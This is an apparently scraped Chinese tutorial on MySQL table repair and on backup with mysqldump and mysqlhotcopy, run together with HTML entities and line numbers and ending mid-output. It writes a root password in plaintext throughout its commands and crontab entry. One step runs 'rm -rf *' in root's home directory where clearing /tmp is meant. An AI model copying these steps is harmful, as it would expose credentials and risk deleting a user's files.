&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| book1 | CREATE TABLE `book1` (&#xA0; `bTypeId` int(11) DEFAULT NULL,&#xA0; `bName` char(16) DEFAULT NULL,&#xA0; `price` int(11) DEFAULT NULL,&#xA0; `publishing` char(16) DEFAULT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8 |+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; exitBye 1234567891011121314[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -r testdb book1mysqlcheck: [Warning] Using a password on the command line interface can be insecure.testdb.book1 OK 3:&#x4FEE;&#x590D;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x5E93;[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -r testdb book1mysqlcheck: [Warning] Using a password on the command line interface can be insecure.testdb.book1 OK&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;[root@jaking ~]# mysqlcheck -uroot -p -r --databases testdbEnter password: testdb.book1 OKtestdb.book2note : The storage engine for the table doesn&apos;t support repair &#x6269;&#x5C55;&#xFF1A; &#x4FEE;&#x590D;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF0C;&#x5BB9;&#x6613;&#x6389;&#x5931;&#x6570;&#x636E; fsck -y -f /dev/sdbx 4: &#x68C0;&#x67E5;&#x4FEE;&#x590D;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;1234567891011121314151617181920212223242526272829303132333435363738[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -A -rbook.book1&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OKbook2.book1note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repairmarket.ordernote&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repairmarket.order1note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repairmarket.usernote&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repairmysql.columns_priv&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OKmysql.db&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OKmysql.engine_costnote&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repairmysql.event&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OKmysql.func&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OKmysql.gtid_executedWarning&#xA0; : Please do not modify the gtid_executed table. This is a mysql internal system table to store GTIDs for committed transactions. Modifying it can lead to an inconsistent GTID state.note&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repairmysql.help_categorynote&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repairmysql.help_keywordnote&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repairmysql.help_relationnote&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repairmysql.help_topicnote&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repairmysql.innodb_index_statsnote&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repairmysql.innodb_table_statsnote&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repairmysql.ndb_binlog_index&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OKmysql.pluginnote&#xA0;&#xA0;&#xA0;&#xA0; : The storage engine for the table doesn&apos;t support repairmysql.proc&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OKmysql.procs_priv&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OKmysql.proxies_priv&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OKmysql.server_cost &#x53C2;&#x6570;-A &#x7B49;&#x4E8E; &#x2013;all-databases 5&#xFF1A;&#x6BCF;&#x5929;&#x5B9A;&#x65F6;&#x5BF9;mysql&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x4F18;&#x5316; &#x4F7F;&#x7528;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;1234crontab -e#0 1 * * * /usr/bin/mysqlcheck -A -o -r&#xA0; -u&#x4F60;&#x7684;&#x7528;&#x6237;&#x540D; -p&#x4F60;&#x7684;&#x5BC6;&#x7801; &gt; /dev/null 2&gt;&amp;10 3 * * *&#xA0; /usr/bin/mysqlcheck -uroot -pJaking@vip.163.com -r -o -A &gt; /dev/null 2&gt;&amp;1 #&#x6BCF;&#x5929;3&#x70B9;&#x4F18;&#x5316; 2&#xFF1A;MySQL&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D; 1)MySQL&#x5907;&#x4EFD;&#x7684;&#x7C7B;&#x578B;&#x6309;&#x7167;&#x5907;&#x4EFD;&#x65F6;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5F71;&#x54CD;&#x8303;&#x56F4;&#x5206;&#x4E3A;&#xFF1A;Hot backup(&#x70ED;&#x5907;) Cold Backup&#xFF08;&#x51B7;&#x5907;&#xFF09;Warm Backup&#xFF08;&#x6E29;&#x5907;&#xFF09;Hot backup&#xFF1A;&#x70ED;&#x5907;&#x6307;&#x5728;&#x6570;&#x636E;&#x5E93;&#x8FD0;&#x884C;&#x4E2D;&#x76F4;&#x63A5;&#x5907;&#x4EFD;&#xFF0C;&#x5BF9;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;&#x6570;&#x636E;&#x5E93;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x5F71;&#x54CD;&#xFF0C;&#xFF08;Online Backup&#xFF09;&#x5B98;&#x65B9;&#x624B;&#x518C;&#x4E3A;&#x5728;&#x7EBF;&#x5907;&#x4EFD;Cold Backup&#xFF1A;&#x51B7;&#x5907;&#x6307;&#x5728;&#x6570;&#x636E;&#x5E93;&#x505C;&#x6B62;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#xFF0C;(OfflineBackup) &#x5B98;&#x65B9;&#x624B;&#x518C;&#x79F0;&#x4E3A;&#x79BB;&#x7EBF;&#x5907;&#x4EFD;Warm Backup&#xFF1A;&#x6E29;&#x5907;&#x6307;&#x5907;&#x4EFD;&#x540C;&#x6837;&#x5728;&#x6570;&#x636E;&#x5E93;&#x8FD0;&#x884C;&#x65F6;&#x8FDB;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x4F1A;&#x5BF9;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x7684;&#x64CD;&#x4F5C;&#x6709;&#x6240;&#x5F71;&#x54CD;&#xFF0C;&#x4F8B;&#x5982;&#x52A0;&#x4E00;&#x4E2A;&#x5168;&#x5C40;&#x8BFB;&#x9501;&#x4EE5;&#x4FDD;&#x8BC1;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027; &#x6309;&#x7167;&#x5907;&#x4EFD;&#x540E;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF1A; &#x903B;&#x8F91;&#x5907;&#x4EFD; &#x2013;&gt;&#x6307;&#x5907;&#x4EFD;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x662F;&#x53EF;&#x8BFB;&#x7684;&#xFF0C;&#x901A;&#x5E38;&#x4E3A;&#x6587;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x5185;&#x5BB9;&#x4E00;&#x822C;&#x662F;SQL&#x8BED;&#x53E5;&#xFF0C;&#x6216;&#x8005;&#x662F;&#x8868;&#x5185;&#x7684;&#x5B9E;&#x9645;&#x6570;&#x636E;&#xFF0C;&#x5982;mysqldump&#x548C;SELECT * INTO OUTFILE&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4E00;&#x822C;&#x9002;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5347;&#x7EA7;&#x548C;&#x8FC1;&#x79FB;&#xFF0C;&#x6062;&#x590D;&#x65F6;&#x95F4;&#x8F83;&#x957F; &#x88F8;&#x6587;&#x4EF6;&#x5907;&#x4EFD;&#x2013;&gt;&#x62F7;&#x8D1D;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7269;&#x7406;&#x6587;&#x4EF6;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x65E2;&#x53EF;&#x4EE5;&#x5904;&#x4E8E;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#xFF08;mysqlhotcopy &#x3001;ibbackup&#x3001;xtrabackup&#x8FD9;&#x7C7B;&#x5DE5;&#x5177;&#xFF09;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5904;&#x4E8E;&#x505C;&#x6B62;&#x72B6;&#x6001;&#xFF0C;&#x6062;&#x590D;&#x65F6;&#x95F4;&#x8F83;&#x77ED;&#x3002; &#x6309;&#x7167;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5185;&#x5BB9;&#x6765;&#x5206;&#xFF0C;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#xFF1A;&#x5B8C;&#x5168;&#x5907;&#x4EFD;&#xFF1A;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x5B8C;&#x6574;&#x7684;&#x5907;&#x4EFD;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF1A;&#x5728;&#x4E0A;&#x4E00;&#x6B21;&#x5B8C;&#x5168;&#x5907;&#x4EFD;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x5BF9;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#xFF08;xtrabackup&#xFF09;&#x65E5;&#x5FD7;&#x5907;&#x4EFD;&#xFF1A;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x5907;&#x4EFD;&#xFF0C;&#x4E3B;&#x4ECE;&#x590D;&#x5236; 2)&#x903B;&#x8F91;&#x5907;&#x4EFD;&#x5DE5;&#x5177;mysqldump&#x4F7F;&#x7528;&#x7684;&#x65F6;&#x5019;MySQL&#x5F53;&#x8981;&#x5BFC;&#x5165;&#x6216;&#x8005;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x91CF;&#x5927;&#x7684;&#x5E93;&#x7684;&#x65F6;&#x5019;,&#x7528;PHPMYADMIN&#x751A;&#x81F3;MySQL Administrator&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x90FD;&#x4F1A;&#x529B;&#x4E0D;&#x4ECE;&#x5FC3;,&#x8FD9;&#x65F6;&#x53EA;&#x80FD;&#x4F7F;&#x7528;MySQL&#x6240;&#x63D0;&#x4F9B;&#x7684;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;mysqldump&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#x6062;&#x590D;&#xFF1B;&#x6570;&#x636E;&#x91CF;&#x5927;&#x7684;&#x65F6;&#x5019;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#xFF0C;&#x53EF;&#x652F;&#x6301;MyISAM,InnoDB MySQL&#x6570;&#x636E;&#x7684;&#x5BFC;&#x51FA;&#x548C;&#x5BFC;&#x5165;&#x5DE5;&#x5177;: mysqldump &#x5BFC;&#x51FA;&#x6570;&#x636E;&#xFF1A;&#x8BED;&#x6CD5;&#xFF1A; mysqldump [TMPIONS] database [tables] &gt;&#x5BFC;&#x51FA;&#x7684;&#x6587;&#x4EF6;&#x540D;.sql A:&#x5BFC;&#x51FA;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;12mysqldump -uroot -pJaking@vip.163.com -A &gt;all.sqlmysqldump -uroot -pJaking@vip.163.com --all-databases &gt;all2.sql &#x53C2;&#x6570;-A&#x4EE3;&#x8868;&#x6240;&#x6709;&#xFF0C;&#x7B49;&#x540C;&#x4E8E; &#x2013;all-databases B:&#x5BFC;&#x51FA;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x5E93;12mysqldump -u &#x7528;&#x6237;&#x540D; -p&#x5BC6;&#x7801; &#x6570;&#x636E;&#x5E93;&#x540D; &gt; &#x5BFC;&#x51FA;&#x7684;&#x6587;&#x4EF6;&#x540D;.sql&#xA0; mysqldump -uroot -pJaking@vip.163.com testdb &gt; testdb.sql C:&#x5BFC;&#x51FA;&#x5355;&#x5F20;&#x8868;1mysqldump -uroot -pJaking@vip.163.com testdb book1 &gt; testdb.book1.sql&#xA0; #&#x5BFC;&#x51FA;testdb&#x5E93;book1&#x8868; D:&#x5BFC;&#x51FA;&#x5E93;&#x7684;&#x8868;&#x7ED3;&#x6784;1mysqldump -uroot -pJaking@vip.163.com -d testdb &gt; testdbtable.sql&#xA0; #&#x53EA;&#x5BFC;&#x51FA;testdb&#x5E93;&#x7684;&#x8868;&#x7ED3;&#x6784; E:&#x53EA;&#x5BFC;&#x51FA;&#x6570;&#x636E;1mysqldump -uroot -pJaking@vip.163.com -t testdb &gt; testdbdata.sql&#xA0; #&#x53EA;&#x5BFC;&#x51FA;testdb&#x5E93;&#x4E2D;&#x7684;&#x6570;&#x636E; F:&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E76;&#x81EA;&#x52A8;&#x751F;&#x6210;&#x5E93;&#x7684;&#x521B;&#x5EFA;&#x8BED;&#x53E5;12mysqldump -uroot -pJaking@vip.163.com -B testdb &gt; testdb.sql #&#x751F;&#x6210;&#x5EFA;&#x5E93;&#x8BED;&#x53E5;mysql -uroot -pJaking@vip.163.com &lt; testdb.sql #&#x5BFC;&#x5165;&#x4E0D;&#x7528;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x540D; &#x5BFC;&#x5165;&#x6570;&#x636E;&#xFF1A;A&#xFF1A;&#x5BFC;&#x5165;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93; mysql -uroot -pJaking@vip.163.com &lt; all.sql B&#xFF1A;&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;1mysql -uroot -pJaking@vip.163.com testdb &lt; testdb.sql&#xA0; #&#x5982;&#x679C;&#x5BFC;&#x5165;&#x65F6;&#xFF0C;&#x6CA1;&#x6709;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x9700;&#x8981;&#x4F60;&#x624B;&#x52A8;&#x521B;&#x5EFA;&#x4E00;&#x4E0B; mysql&gt; create database testdb; &#x4F7F;&#x7528;source&#x5BFC;&#x5165;mysql&gt; drop database testdb;mysql&gt; create database testdb;mysql&gt; use testdb;mysql&gt; source /tmp/testdb.sql C:&#x5BFC;&#x5165;&#x8868;mysql&gt; drop table testdb.book1;mysql&gt; source /tmp/testdb.book1.sql; #&#x5BFC;&#x5165;&#x8868;&#x65F6;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x521B;&#x5EFA;&#x8868;&#xFF0C;&#x8981;&#x5148;&#x8FDB;&#x5230;&#x76F8;&#x5E94;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;mysql&gt; select * from testdb.book1; D&#xFF1A;&#x5BFC;&#x5165;&#x8868;&#x7ED3;&#x6784;&#x548C;&#x6570;&#x636E;mysql&gt; create database testdb;mysql -uroot -pJaking@vip.163.com testdb &lt; testdbtable.sqlmysql -uroot -pJaking@vip.163.com testdb &lt; testdbdata.sql mysqldump&#x8FDC;&#x7A0B;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x6570;&#x636E; &#x6587;&#x6863;&#xFF1A;10 mysqldump&#x8FDC;&#x7A0B;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x6570;&#x636E;.md&#x94FE;&#x63A5;&#xFF1A;http://note.youdao.com/noteshare?id=7af3e7cda297defe01228ed798e72c02&amp;sub=E2F44DF8E1BC4B9287EA434DEA3B670C &#x8FDC;&#x7A0B;&#x5907;&#x4EFD;mysqldump -h ip_addr -u db_user -p db_name &gt; file_name.sql&#x8FDC;&#x7A0B;&#x6062;&#x590D;mysql -h ip_addr -u db_user -p &lt; db_file.sql 3) mysqlhotcopy &#x88F8;&#x6587;&#x4EF6;&#x5907;&#x4EFD; &#x6CE8;&#x610F;&#xFF1A;5.7&#x7248;&#x672C;&#x5DF2;&#x7ECF;&#x53BB;&#x6389;&#x6B64;&#x547D;&#x4EE4;&#xFF0C;&#x8BF7;&#x5728;5.5&#x53CA;&#x4EE5;&#x4E0B;&#x7248;&#x672C;&#x6D4B;&#x8BD5;&#xFF01;mysqlhotcopy&#x4F7F;&#x7528;lock tables&#x3001;flush tables&#x548C;cp&#x6216;scp&#x6765;&#x5FEB;&#x901F;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5B83;&#x662F;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x6216;&#x5355;&#x4E2A;&#x8868;&#x6700;&#x5FEB;&#x7684;&#x9014;&#x5F84;,&#x5B8C;&#x5168;&#x5C5E;&#x4E8E;&#x7269;&#x7406;&#x5907;&#x4EFD;,&#x4F46;&#x53EA;&#x80FD;&#x7528;&#x4E8E;&#x5907;&#x4EFD;MyISAM&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x548C;&#x8FD0;&#x884C;&#x5728;&#x6570;&#x636E;&#x5E93;&#x76EE;&#x5F55;&#x6240;&#x5728;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x4E0E;mysqldump&#x5907;&#x4EFD;&#x4E0D;&#x540C;,mysqldump&#x5C5E;&#x4E8E;&#x903B;&#x8F91;&#x5907;&#x4EFD;,&#x6062;&#x590D;&#x65F6;&#x662F;&#x6267;&#x884C;&#x7684;sql&#x8BED;&#x53E5;&#x3002; mysqlhotcopy&#x672C;&#x8D28;&#x662F;&#x4F7F;&#x7528;&#x9501;&#x8868;&#x8BED;&#x53E5;&#x540E;&#x518D;&#x4F7F;&#x7528;cp&#x6216;scp&#x62F7;&#x8D1D;&#x6570;&#x636E;&#x5E93; 1.&#x5B89;&#x88C5;mysqlhotcopy yum provides mysqlhotcopyyum install -y mariadb-server 2.&#x67E5;&#x770B;mysqlhotcopy&#x5E2E;&#x52A9;&#x4FE1;&#x606F; mysqlhotcopy &#x2013;help &#x2013;allowold don&#x2019;t abort if target dir already exists (rename it _old) &#x2013;&#x4E0D;&#x8986;&#x76D6;&#x4EE5;&#x524D;&#x5907;&#x4EFD;&#x7684;&#x6587;&#x4EF6; &#x2013;addtodest don&#x2019;t rename target dir if it exists, just add files to it &#x2013;&#x5C5E;&#x4E8E;&#x589E;&#x91CF;&#x5907;&#x4EFD; &#x2013;noindices don&#x2019;t include full index files in copy &#x2013;&#x4E0D;&#x5907;&#x4EFD;&#x7D22;&#x5F15;&#x6587;&#x4EF6; &#x2013;debug enable debug &#x2013;&#x542F;&#x7528;&#x8C03;&#x8BD5;&#x8F93;&#x51FA; &#x2013;regexp=# copy all databases with names matching regexp &#x2013;&#x4F7F;&#x7528;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F; &#x2013;checkpoint=# insert checkpoint entry into specified db.table &#x2013;&#x63D2;&#x5165;&#x68C0;&#x67E5;&#x70B9;&#x6761;&#x76EE; &#x2013;flushlog flush logs once all tables are locked &#x2013;&#x6240;&#x6709;&#x8868;&#x9501;&#x5B9A;&#x540E;&#x5237;&#x65B0;&#x65E5;&#x5FD7; &#x2013;resetmaster reset the binlog once all tables are locked &#x2013;&#x4E00;&#x65E6;&#x9501;&#x8868;&#x91CD;&#x7F6E;binlog&#x6587;&#x4EF6; &#x2013;resetslave reset the master.info once all tables are locked &#x2013;&#x4E00;&#x65E6;&#x9501;&#x8868;&#x91CD;&#x7F6E;master.info&#x6587;&#x4EF6; &#x4E3E;&#x4F8B;&#x8BF4;&#x660E;&#xFF1A;A&#xFF1A;&#x5907;&#x4EFD;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5230;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x4E2D;mysqlhotcopy -u root -p Jaking@vip.163.com BOOK /tmp #-u -p &#x540E;&#x9762;&#x90FD;&#x6709;&#x7A7A;&#x683C; [root@jaking ~]# mysqlhotcopy -u root -p Jaking@vip.163.com BOOK /tmpFlushed 1 tables with read lock (BOOK.book) in 0 seconds.Locked 0 views () in 0 seconds.Copying 2 files&#x2026;Copying indices for 0 files&#x2026;Unlocked tables.mysqlhotcopy copied 1 tables (2 files) in 0 seconds (0 seconds overall).[root@jaking ~]# ls /tmpBOOK[root@jaking ~]# ls /tmp/BOOK/book.frm db.opt &#x5BF9;&#x6BD4;&#x4E0B;&#x5927;&#x5C0F; [root@jaking ~]# du -sh /var/lib/mysql/BOOK/ /tmp/BOOK/16K /var/lib/mysql/BOOK/16K /tmp/BOOK/ B&#xFF1A;&#x5907;&#x4EFD;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5230;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;12345678910111213141516171819202122232425262728[root@jaking ~]# rm -rf /tmp/*[root@jaking ~]# mysqlhotcopy -u root -p Jaking@vip.163.com BOOK mysql /tmp/mysqlhotcopy -u root -p Jaking@vip.163.com BOOK mysql /tmp/Flushed 23 tables with read lock (`BOOK`.`book`, `mysql`.`columns_priv`, `mysql`.`db`, `mysql`.`event`, `mysql`.`func`, `mysql`.`help_category`, `mysql`.`help_keyword`, `mysql`.`help_relation`, `mysql`.`help_topic`, `mysql`.`host`, `mysql`.`ndb_binlog_index`, `mysql`.`plugin`, `mysql`.`proc`, `mysql`.`procs_priv`, `mysql`.`proxies_priv`, `mysql`.`servers`, `mysql`.`tables_priv`, `mysql`.`time_zone`, `mysql`.`time_zone_leap_second`, `mysql`.`time_zone_name`, `mysql`.`time_zone_transition`, `mysql`.`time_zone_transition_type`, `mysql`.`user`) in 0 seconds.Locked 0 views () in 0 seconds.Copying 2 files...Copying indices for 0 files...Copying 72 files...Copying indices for 0 files...Unlocked tables.mysqlhotcopy copied 24 tables (74 files) in 0 seconds (0 seconds overall).[root@jaking ~]# ls /tmpBOOK mysql[root@jaking ~]# du -h /tmp 0 /tmp/.X11-unix0 /tmp/.font-unix0 /tmp/.ICE-unix0 /tmp/.XIM-unix0 /tmp/.Test-unix16K /tmp/BOOK1004K /tmp/mysql1020K /tmp[root@jaking ~]# du -h /var/lib/mysql/1004K /var/lib/mysql/mysql212K /var/lib/mysql/performance_schema16K /var/lib/mysql/BOOK30M /var/lib/mysql/ C&#xFF1A;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x8868;&#x8BED;&#x6CD5;&#xFF1A;mysqlhotcopy -u &#x7528;&#x6237; -p &#x5BC6;&#x7801; &#x6570;&#x636E;&#x5E93;&#x540D;./&#x8981;&#x5907;&#x4EFD;&#x7684;&#x8868;&#x540D;/ &#x8981;&#x5907;&#x4EFD;&#x7684;&#x8DEF;&#x5F84; mysqlhotcopy -u root -p Jaking@vip.163.com BOOK./book/ /tmp/ #&#x6CE8;&#x610F;&#x6700;&#x540E;&#x7684; / &#x4E00;&#x5B9A;&#x8981;&#x6709;&#xFF01;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x628A;&#x5BF9;&#x5E94;&#x7684;&#x8868;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/tmp&#x76EE;&#x5F55;&#x4E0B;123456789101112[root@jaking ~]# rm -rf *[root@jaking ~]# mysqlhotcopy -u root -p Jaking@vip.163.com BOOK./book/ /tmp/ Flushed 1 tables with read lock (`BOOK`.`book`) in 0 seconds.Locked 0 views () in 0 seconds.Copying 1 files...Copying 